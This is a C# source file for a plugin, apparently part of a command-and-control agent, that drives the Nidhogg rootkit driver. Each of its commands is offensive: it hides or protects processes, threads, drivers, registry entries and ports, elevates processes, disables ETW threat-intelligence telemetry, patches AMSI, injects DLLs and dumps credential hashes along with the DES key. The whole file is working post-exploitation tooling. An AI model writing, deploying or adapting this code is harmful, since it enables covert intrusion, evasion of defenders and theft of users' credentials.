using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Text.Json;
using nidhogg;
using NidhoggCSharpApi;
using System.Runtime.InteropServices;
using System.Text;
using static NidhoggCSharpApi.NidhoggApi;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "nidhogg";
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
        }
        public async Task Execute(ServerJob job)
        {
            NidhoggArgs args = JsonSerializer.Deserialize<NidhoggArgs>(job.task.parameters);

            try
            {
                var nidhogg = new NidhoggApi();
                //var nidhogg = new NidhoggApi("\\\\.\\NotNidhogg");
                await this.HandleNidhoggCommand(nidhogg, args, job.task.id);
            }
            catch (NidhoggApiException e)
            {
                await this.messageManager.WriteLine(e.Message, job.task.id, true, "error");
                return;
            }
        }

        private async Task HandleNidhoggCommand(NidhoggApi api, NidhoggArgs args, string task_id)
        {
            switch (args.command.ToLower())
            {
                case "executescript":
                    await this.ExecuteNidhoggScript(api, args, task_id);
                    break;
                case "protectfile":
                    await this.ModifyFileProtections(api, args, task_id, true);
                    break;
                case "unprotectfile":
                    await this.ModifyFileProtections(api, args, task_id, false);
                    break;
                case "protectprocess":
                    await this.ModifyProcessProtections(api, args, task_id, true);
                    break;
                case "unprotectprocess":
                    await this.ModifyProcessProtections(api, args, task_id, false);
                    break;
                case "hideprocess":
                    await this.ModifyProcessVisibility(api, args, task_id, true);
                    break;
                case "unhideprocess":
                    await this.ModifyProcessVisibility(api, args, task_id, false);
                    break;
                case "elevateprocess":
                    await this.ModifyProcessElevation(api, args, task_id);
                    break;
                case "hidethread":
                    await this.ModifyThreadVisibility(api, args, task_id, true);
                    break;
                case "unhidethread":
                    await this.ModifyThreadVisibility(api, args, task_id, false);
                    break;
                case "protectthread":
                    await this.ModifyThreadProtection(api, args, task_id, true);
                    break;
                case "unprotectthread":
                    await this.ModifyThreadProtection(api, args, task_id, false);
                    break;
                case "protectregistrykey":
                    await this.ModifyRegistryKeyProtection(api, args, task_id, true);
                    break;
                case "unprotectregistrykey":
                    await this.ModifyRegistryKeyProtection(api, args, task_id, false);
                    break;
                case "hideregistrykey":
                    await this.ModifyRegistryKeyVisibility(api, args, task_id, true);
                    break;
                case "unhideregistrykey":
                    await this.ModifyRegistryKeyVisibility(api, args, task_id, false);
                    break;
                case "protectregistryvalue":
                    await this.ModifyRegistryValueProtection(api, args, task_id, true);
                    break;
                case "unprotectregistryvalue":
                    await this.ModifyRegistryValueProtection(api, args, task_id, false);
                    break;
                case "hideregistryvalue":
                    await this.ModifyRegistryValueVisibility(api, args, task_id, true);
                    break;
                case "unhideregistryvalue":
                    await this.ModifyRegistryValueVisibility(api, args, task_id, false);
                    break;
                case "enableetwti":
                    await this.NidhoggModifyEtwTi(api, task_id, true);
                    break;
                case "disableetwti":
                    await this.NidhoggModifyEtwTi(api, task_id, false);
                    break;
                case "hidedriver":
                    await this.NidhoggModifyDriverVisibility(api, args, task_id, true);
                    break;
                case "unhidedriver":
                    await this.NidhoggModifyDriverVisibility(api, args, task_id, false);
                    break;
                case "hidemodule":
                    await this.NidhoggModifyModuleVisibility(api, args, task_id);
                    break;
                case "hideport":
                    await this.NidhoggModifyPortVisibility(api, args, task_id, true);
                    break;
                case "unhideport":
                    await this.NidhoggModifyPortVisibility(api, args, task_id, false);
                    break;
                case "dumpcreds":
                    await this.NidhoggDumpCredentials(api, task_id);
                    break;
                case "injectdll":
                    await this.NidhoggDllInjection(api, args, task_id);
                    break;
                default:
                    break;
            }
        }

        private async Task ExecuteNidhoggScript(NidhoggApi api, NidhoggArgs args, string task_id)
        {
            byte[] fileData = Misc.Base64DecodeToByteArray(args.script);
            IntPtr dataPtr = Marshal.AllocHGlobal(fileData.Length);
            Marshal.Copy(fileData, 0, dataPtr, fileData.Length);
            NidhoggApi.NidhoggErrorCodes error;
            error = api.ExecuteScript(dataPtr, (uint)fileData.Length);
            Marshal.FreeHGlobal(dataPtr);

            if (error != NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS)
            {
                await this.messageManager.WriteLine($"Failed to execute script: {error}", task_id, true, "error");
                return;
            }


            await this.messageManager.WriteLine("Script executed succesfully", task_id, true);
        }
        private async Task ModifyFileProtections(NidhoggApi api, NidhoggArgs args, string task_id, bool protect)
        {
            StringBuilder sb = new StringBuilder();
            NidhoggApi.NidhoggErrorCodes err;

            if (protect)
            {
                err = api.FileProtect(args.path);

                if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                {
                    await this.messageManager.WriteLine($"Failed to protect file: {err}", task_id, true, "error");
                    return;
                }
                sb.AppendLine("[+] File protected successfully.");
            }
            else
            {
                err = api.FileUnprotect(args.path);

                if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                {
                    await this.messageManager.WriteLine($"Failed to unprotect file: {err}", task_id, true, "error");
                    return;
                }
                sb.AppendLine("[+] File unprotected successfully.");
            }

            sb.AppendLine("[+] Files after protect:");

            string[] files = api.QueryFiles() ?? new string[0];

            foreach (var file in files)
            {
                sb.AppendLine($"\t{file}");
            }

            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
        }
        private async Task ModifyProcessProtections(NidhoggApi api, NidhoggArgs args, string task_id, bool protect)
        {
            StringBuilder sb = new StringBuilder();
            NidhoggApi.NidhoggErrorCodes err;

            if (protect)
            {
                err = api.ProcessProtect(args.id);

                if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                {
                    await this.messageManager.WriteLine($"Failed to protect process: {err}", task_id, true, "error");
                    return;
                }
                sb.AppendLine("[+] Process protected successfully.");

            }
            else
            {
                err = api.ProcessUnprotect(args.id);

                if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                {
                    await this.messageManager.WriteLine($"Failed to unprotect process: {err}", task_id, true, "error");
                    return;
                }
                sb.AppendLine("[+] Process unprotected successfully.");
            }

            sb.AppendLine("[+] Protected Processes:");

            uint[] procs = api.QueryProtectedProcesses() ?? new uint[0];

            foreach (var proc in procs)
            {
                sb.AppendLine($"\t{proc}");
            }

            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
        }
        private async Task ModifyProcessVisibility(NidhoggApi api, NidhoggArgs args, string task_id, bool hide)
        {
            StringBuilder sb = new StringBuilder();
            NidhoggApi.NidhoggErrorCodes err;
            if (hide)
            {
                Console.WriteLine(args.id);
                err = api.ProcessHide(args.id);

                if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                {
                    await this.messageManager.WriteLine($"Failed to hide process: {err}", task_id, true, "error");
                    return;
                }
                sb.AppendLine("[+] Process hidden successfully.");

            }
            else
            {
                err = api.ProcessUnhide(args.id);

                if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                {
                    await this.messageManager.WriteLine($"Failed to unhide process: {err}", task_id, true, "error");
                    return;
                }
                sb.AppendLine("[+] Process unhidden successfully.");
            }

            sb.AppendLine("Successfully modified visibility of process: " + args.id);


            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
        }
        private async Task ModifyProcessElevation(NidhoggApi api, NidhoggArgs args, string task_id)
        {
            StringBuilder sb = new StringBuilder();
            NidhoggApi.NidhoggErrorCodes err;
            err = api.ProcessElevate(args.id);

            if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
            {
                await this.messageManager.WriteLine($"Failed to protect process: {err}", task_id, true, "error");
                return;
            }

            sb.AppendLine("Successfully elevated process: " + args.id);
            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
        }
        private async Task ModifyThreadVisibility(NidhoggApi api, NidhoggArgs args, string task_id, bool hide)
        {
            StringBuilder sb = new StringBuilder();
            NidhoggApi.NidhoggErrorCodes err;
            if (hide)
            {
                err = api.ThreadHide(args.id);

                if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                {
                    await this.messageManager.WriteLine($"Failed to hide thread: {err}", task_id, true, "error");
                    return;
                }
                sb.AppendLine("[+] Succesfully hid thread: " + args.id);
            }
            else
            {
                err = api.ThreadUnhide(args.id);

                if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                {
                    await this.messageManager.WriteLine($"Failed to unhide thread: {err}", task_id, true, "error");
                    return;
                }
                sb.AppendLine("[+] Succesfully unhid thread: " + args.id);
            }
            await this.messageManager.WriteLine(sb.ToString(), task_id, true); ;
        }
        private async Task ModifyThreadProtection(NidhoggApi api, NidhoggArgs args, string task_id, bool protect)
        {
            StringBuilder sb = new StringBuilder();
            NidhoggApi.NidhoggErrorCodes err;
            if (protect)
            {
                err = api.ThreadProtect(args.id);

                if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                {
                    await this.messageManager.WriteLine($"Failed to protect thread: {err}", task_id, true, "error");
                    return;
                }
                sb.AppendLine("[+] Succesfully protected thread: " + args.id);
            }
            else
            {
                err = api.ThreadUnprotect(args.id);

                if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                {
                    await this.messageManager.WriteLine($"Failed to unprotect thread: {err}", task_id, true, "error");
                    return;
                }
                sb.AppendLine("[+] Succesfully unprotected thread: " + args.id);
            }

            sb.AppendLine("[+] Protected Threads");

            uint[] tids = api.QueryProtectedThreads() ?? new uint[0];

            foreach (var tid in tids)
            {
                sb.AppendLine("\t" +  tid);
            }


            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
        }
        private async Task ModifyRegistryKeyProtection(NidhoggApi api, NidhoggArgs args, string task_id, bool protect)
        {
            StringBuilder sb = new StringBuilder();
            NidhoggApi.NidhoggErrorCodes err;
            if (protect)
            {
                err = api.RegistryProtectKey(args.path);

                if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                {
                    await this.messageManager.WriteLine($"Failed to protect key: {err}", task_id, true, "error");
                    return;
                }
                sb.AppendLine("[+] Succesfully protected key: " + args.path);
            }
            else
            {
                err = api.RegistryUnprotectKey(args.path);

                if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                {
                    await this.messageManager.WriteLine($"Failed to unprotect key: {err}", task_id, true, "error");
                    return;
                }
                sb.AppendLine("[+] Succesfully unprotected key: " + args.path);
            }

            sb.AppendLine("[+] Protected registry keys");
            foreach (var val in api.QueryProtectedRegistryKeys() ?? new string[0])
            {
                sb.AppendLine("\t" + val);
            }
            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
        }
        private async Task ModifyRegistryKeyVisibility(NidhoggApi api, NidhoggArgs args, string task_id, bool hide)
        {
            StringBuilder sb = new StringBuilder();
            NidhoggApi.NidhoggErrorCodes err;
            if (hide)
            {
                err = api.RegistryHideKey(args.path);

                if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                {
                    await this.messageManager.WriteLine($"Failed to hide key: {err}", task_id, true, "error");
                    return;
                }
                sb.AppendLine("[+] Succesfully hid Key: " + args.path);
            }
            else
            {
                err = api.RegistryUnhideKey(args.path);

                if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                {
                    await this.messageManager.WriteLine($"Failed to hide key: {err}", task_id, true, "error");
                    return;
                }
                sb.AppendLine("[+] Succesfully unhid Key: " + args.path);
            }

            sb.AppendLine("[+] Hidden registry keys");

            foreach (var val in api.QueryHiddenRegistryKeys() ?? new string[0])
            {
                sb.AppendLine("\t" + val);
            }
            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
        }
        private async Task ModifyRegistryValueProtection(NidhoggApi api, NidhoggArgs args, string task_id, bool protect)
        {
            StringBuilder sb = new StringBuilder();
            NidhoggApi.NidhoggErrorCodes err;
            if (protect)
            {
                err = api.RegistryProtectValue(args.path, args.value);

                if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                {
                    await this.messageManager.WriteLine($"Failed to protect value: {err}", task_id, true, "error");
                    return;
                }
                sb.AppendLine("[+] Succesfully protected value: " + args.value + " at: " + args.path);
            }
            else
            {
                err = api.RegistryProtectValue(args.path, args.value);

                if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                {
                    await this.messageManager.WriteLine($"Failed to unprotect value: {err}", task_id, true, "error");
                    return;
                }
                sb.AppendLine("[+] Succesfully unprotected value: " + args.value + " at: " + args.path);
            }

            sb.AppendLine("[+] Protected registry values");

            foreach (var val in api.QueryProtectedRegistryValues() ?? new Dictionary<string, string>())
            {
                sb.AppendLine("\t" + val);
            }
            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
        }
        private async Task ModifyRegistryValueVisibility(NidhoggApi api, NidhoggArgs args, string task_id, bool hide)
        {
            StringBuilder sb = new StringBuilder();
            NidhoggApi.NidhoggErrorCodes err;
            if (hide)
            {
                err = api.RegistryHideValue(args.path, args.value);

                if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                {
                    await this.messageManager.WriteLine($"Failed to hide value: {err}", task_id, true, "error");
                    return;
                }
                sb.AppendLine("[+] Succesfully hid value: " + args.value + " at: " + args.path);
            }
            else
            {
                err = api.RegistryUnhideValue(args.path, args.value);

                if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                {
                    await this.messageManager.WriteLine($"Failed to unhide value: {err}", task_id, true, "error");
                    return;
                }
                sb.AppendLine("[+] Succesfully unhid value: " + args.value + " at: " + args.path);
            }

            sb.AppendLine("[+] Hidden registry values");

            foreach (var val in api.QueryHiddenRegistryValues() ?? new Dictionary<string, string>())
            {
                sb.AppendLine("\t" + val);
            }
            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
        }
        private async Task NidhoggModifyEtwTi(NidhoggApi api, string task_id, bool enable)
        {
            StringBuilder sb = new StringBuilder();
            NidhoggApi.NidhoggErrorCodes err = api.EnableDisableEtwTi(enable);

            if (err != NidhoggErrorCodes.NIDHOGG_SUCCESS)
            {
                await this.messageManager.WriteLine($"Failed to disable etwti: {err}", task_id, true, "error");
                return;
            }

            sb.AppendLine(enable ? "[+] Etwti enabled" : "[+] Etwti disabled");

            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
        }
        private async Task NidhoggListCallbacks(NidhoggApi api, string task_id, CallbackType type)
        {
            StringBuilder sb = new StringBuilder();
            PsRoutinesList psRoutines = api.ListPsRoutines(type);
            sb.AppendLine("[+] Callbacks:");

            for (int i = 0; i < psRoutines.NumberOfRoutines; i++)
            {
                sb.AppendLine($"\tDriver Name: {psRoutines.Routines[i].DriverName}");
                sb.AppendLine($"\tAddress: {psRoutines.Routines[i].CallbackAddress}\n");
            }
        }
        private async Task NidhoggModifyDriverVisibility(NidhoggApi api, NidhoggArgs args, string task_id, bool hide)
        {
            StringBuilder sb = new StringBuilder();
            NidhoggApi.NidhoggErrorCodes err;
            if (hide)
            {
                err = api.HideDriver(args.path);

                if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                {
                    await this.messageManager.WriteLine($"Failed to hide driver: {err}", task_id, true, "error");
                    return;
                }

                sb.AppendLine("[+] Succesfully hid driver: " + args.path);
            }
            else
            {
                err = api.UnhideDriver(args.path);

                if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                {
                    await this.messageManager.WriteLine($"Failed to unhide unhide: {err}", task_id, true, "error");
                    return;
                }

                sb.AppendLine("[+] Succesfully unhid driver: " + args.path);
            }
 
            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
        }
        private async Task NidhoggModifyAmsi(NidhoggApi api, NidhoggArgs args, string task_id)
        {
            StringBuilder sb = new StringBuilder();
            NidhoggApi.NidhoggErrorCodes err;

            err = api.AmsiBypass(args.id);
            if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
            {
                await this.messageManager.WriteLine($"Failed to patch: {err}", task_id, true, "error");
                return;
            }

            sb.AppendLine("Success");
            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
        }
        private async Task NidhoggModifyModuleVisibility(NidhoggApi api, NidhoggArgs args, string task_id)
        {
            StringBuilder sb = new StringBuilder();
            NidhoggApi.NidhoggErrorCodes err;
            err = api.HideModule(args.id, args.path);

            if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
            {
                await this.messageManager.WriteLine($"Failed to modify module: {err}", task_id, true, "error");
                return;
            }

            sb.AppendLine("Succesfully modified module");
            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
        }
        private async Task NidhoggModifyPortVisibility(NidhoggApi api, NidhoggArgs args, string task_id, bool hide)
        {
            StringBuilder sb = new StringBuilder();
            NidhoggApi.NidhoggErrorCodes err;
            if (hide)
            {
                err = api.HidePort((ushort)args.id, false, PortType.TCP);

                if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                {
                    await this.messageManager.WriteLine($"Failed to hide driver: {err}", task_id, true, "error");
                    return;
                }
                sb.AppendLine("[+] Succesfully hid port: " + args.id);
            }
            else
            {
                err = api.UnhidePort((ushort)args.id, false, PortType.TCP);

                if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                {
                    await this.messageManager.WriteLine($"Failed to unhide unhide: {err}", task_id, true, "error");
                    return;
                }
                sb.AppendLine("[+] Succesfully unhid port: " + args.id);
            }

            sb.AppendLine("[+] Hidden Ports: ");
            foreach (var port in api.QueryHiddenPorts() ?? new HiddenPort[0])
            {
                
                sb.AppendLine($"\tPort: {port.Port}\t Remote:{port.Remote}\t Tcp: {port.Type}");
            }

            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
        }
        private async Task NidhoggDumpCredentials(NidhoggApi api, string task_id)
        {
            StringBuilder sb = new StringBuilder();
            Credentials[] credentials;
            DesKeyInformation desKey;
            string currentUsername;
            string currentDomain;
            string currentEncryptedHash;

            (credentials, desKey) = api.DumpCredentials();
            if (credentials == null)
            {
                await this.messageManager.WriteLine($"[-] Failed to dump credentials.", task_id, true, "error");
                return;
            }

            sb.AppendLine("[+] Des Key:");
            byte[] dataBytes = new byte[desKey.Size];
            Marshal.Copy(desKey.Data, dataBytes, 0, (int)desKey.Size);

            foreach (byte b in dataBytes)
            {
                sb.Append(b.ToString("X2"));
                sb.Append(" ");
            }
            sb.AppendLine();
            sb.AppendLine("[+] Credentials:");
            foreach (Credentials credential in credentials)
            {
                currentUsername = Marshal.PtrToStringUni(credential.Username.Buffer);
                sb.AppendLine($"Username: {currentUsername}");
                currentDomain = Marshal.PtrToStringUni(credential.Domain.Buffer);
                sb.AppendLine($"Domain: {currentDomain}");
                currentEncryptedHash = Marshal.PtrToStringUni(credential.EncryptedHash.Buffer);

                // Print encrypted hash as hex
                byte[] hashBytes = Encoding.Unicode.GetBytes(currentEncryptedHash);
                string hexString = BitConverter.ToString(hashBytes).Replace("-", " ");
                sb.AppendLine($"Encrypted hash: {hexString}");
            }
            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
        }
        //Add support for specifying the type
        private async Task NidhoggDllInjection(NidhoggApi api, NidhoggArgs args, string task_id)
        {
            StringBuilder sb = new StringBuilder();

            var err = api.DllInject(args.id, args.path, InjectionType.APCInjection);
            if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
            {
                await this.messageManager.WriteLine($"Failed to inject dll: {err}", task_id, true, "error");
                return;
            }

            sb.AppendLine($"Succesfully injected {args.path} into {args.id}.");
            await this.messageManager.WriteLine(sb.ToString(), task_id, true);
        }
    }
}
